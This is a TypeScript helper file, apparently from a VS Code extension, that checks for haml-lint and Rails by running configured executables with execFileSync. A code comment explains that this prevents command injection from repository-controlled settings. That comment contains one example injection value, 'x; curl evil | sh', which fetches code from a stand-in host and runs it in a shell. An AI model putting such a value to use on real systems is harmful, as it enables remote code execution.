import { execFileSync } from 'node:child_process';
import { OutputChannel, workspace } from 'vscode';

import { SOURCE } from './linter';

// Probes an executable by running `<executable> --version`.
//
// Uses execFileSync (argv form, no shell) instead of exec so that the
// executable path — which comes from workspace settings and can therefore be
// controlled by a repository's `.vscode/settings.json` — is never interpreted
// by a shell. This prevents command injection (e.g. "x; curl evil | sh") and,
// because execFileSync throws synchronously, makes the try/catch actually work.
function commandAvailable(executable: string): boolean {
  try {
    execFileSync(executable, ['--version'], { stdio: 'ignore' });
    return true;
  } catch (e) {
    return false;
  }
}

export function hamlLintPresent(): boolean {
  const config = workspace.getConfiguration('hamlAll');
  const executable = config.linterExecutablePath || SOURCE;

  return commandAvailable(executable);
}

export function isARailsProject(outputChanel: OutputChannel | null): boolean {
  const config = workspace.getConfiguration('railsRoutes');
  const executable = config.railsCommand || 'bin/rails';

  if (commandAvailable(executable)) {
    outputChanel?.appendLine('Rails project detected.');
    return true;
  }

  return false;
}
